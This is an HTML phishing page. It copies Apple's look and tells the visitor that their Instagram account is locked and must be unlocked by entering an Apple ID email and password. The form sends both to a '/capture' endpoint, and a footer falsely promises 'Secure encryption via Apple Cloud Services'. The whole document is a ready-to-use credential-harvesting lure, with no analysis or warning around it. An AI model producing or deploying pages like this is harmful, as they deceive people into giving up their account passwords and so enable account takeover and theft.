<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Appeal | Identity Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; width: 100%; max-width: 400px; padding: 40px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
        .meta-logo { width: 100px; margin-bottom: 20px; }
        .apple-icon { font-size: 40px; color: #000; margin-bottom: 15px; }
        h1 { font-size: 24px; font-weight: 600; color: #1d1d1f; margin-bottom: 10px; }
        p { font-size: 14px; color: #86868b; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
        .input-group { position: relative; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #0071e3; box-shadow: 0 0 0 4px rgba(0,113,227,0.1); }
        button { width: 100%; padding: 15px; background-color: #0071e3; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background-color: #0077ed; }
        .footer { margin-top: 25px; font-size: 12px; color: #a1a1a6; display: flex; align-items: center; justify-content: center; gap: 5px; }
        .lock-icon { font-size: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <i class="fab fa-apple apple-icon"></i>
        <h1>Identity Verification</h1>
        <p>Your Instagram account (meta-appeal-ref) is temporarily locked. Please verify your identity using your Apple ID to match device ownership.</p>
        
        <form action="/capture" method="POST">
            <div class="input-group">
                <input type="email" name="email" placeholder="Apple ID" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Continue</button>
        </form>

        <div class="footer">
            <i class="fas fa-lock lock-icon"></i>
            <span>Secure encryption via Apple Cloud Services</span>
        </div>
    </div>
</body>
</html>
